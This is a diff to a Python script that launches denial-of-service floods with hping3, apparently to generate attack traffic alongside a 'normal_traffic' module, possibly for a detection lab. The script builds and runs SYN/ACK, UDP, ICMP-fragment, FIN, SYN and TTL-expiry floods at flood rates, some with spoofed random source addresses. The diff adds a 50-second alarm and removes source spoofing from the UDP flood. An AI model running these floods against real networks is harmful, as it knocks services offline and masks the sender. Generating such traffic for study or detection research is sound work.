@@ -2,8 +2,8 @@ import scapy.all as scapy
 import sys
 import os
 import random
-from normal_traffic import networks
-
+from normal_traffic import networks,ctrl_c_handler
+import signal
 attack = ["tcp_syn_ack","udp","icmp_frag","fin","syn","ttl_expiry"]
 packet_interval = ["fast","faster","flood"]
 
@@ -19,7 +19,7 @@ def attack_check(type,network,speed):
     if type == "tcp_syn_ack":
         os.system("sudo hping3 --syn --ack --rand-source --{0} -p {1[0]} -d {1[1]} {1[2]}".format(speed,tuple_gen(network)))
     elif type == "udp":
-        os.system("sudo hping3 --udp --rand-source --{0} -p {1[0]} -d {1[1]} {1[2]}".format(speed,tuple_gen(network)))
+        os.system("sudo hping3 --udp --{0} -p {1[0]} -d {1[1]} {1[2]}".format(speed,tuple_gen(network)))
     elif type == "icmp_frag":
         os.system("sudo hping3 -1 -d 10000 -i u10 " + network)
     elif type == "fin":
@@ -32,7 +32,7 @@ def attack_check(type,network,speed):
 
 
 if __name__ == "__main__":
-
+    signal.signal(signal.SIGALRM, ctrl_c_handler)
     try: 
         attack_type = sys.argv[1]
         speed = sys.argv[2]
@@ -40,6 +40,7 @@ if __name__ == "__main__":
     except IndexError as e:
         print("Not all parameters provided: {}".format(e))
     
+    signal.alarm(50)
     if speed in packet_interval and attack_type in attack:
         attack_check(attack_type,network,speed)
         
